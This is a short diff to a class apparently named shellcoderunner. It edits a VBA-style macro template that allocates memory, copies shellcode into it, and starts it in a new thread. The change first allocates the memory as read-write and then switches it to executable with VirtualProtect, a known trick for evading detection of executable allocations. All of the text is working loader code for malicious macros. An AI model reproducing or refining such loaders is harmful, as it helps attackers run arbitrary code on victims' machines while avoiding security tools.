@@ -24,12 +24,15 @@ class shellcoderunner:
 
     ' &H3000 = 0x3000 = MEM_COMMIT | MEM_RESERVE
     ' &H40 = 0x40 = PAGE_EXECUTE_READWRITE
-    addr = {VirtualAlloc}(0, UBound(shellcode), &H3000, &H40)
+    addr = {VirtualAlloc}(0, UBound(shellcode), &H3000, &H4)
 
     For counter = LBound(shellcode) To UBound(shellcode)
       data = shellcode(counter)
       res = {RtlMoveMemory}(addr + counter, data, 1)
     Next counter
+
+    Dim oldProtect as Long
+    res = {VirtualProtect}(addr, UBound(shellcode), &H40, oldProtect)
 
     res = {CreateThread}(0, 0, addr, 0, 0, 0)
     success = {WaitForSingleObject}(res, &HFFFFFFFF&)
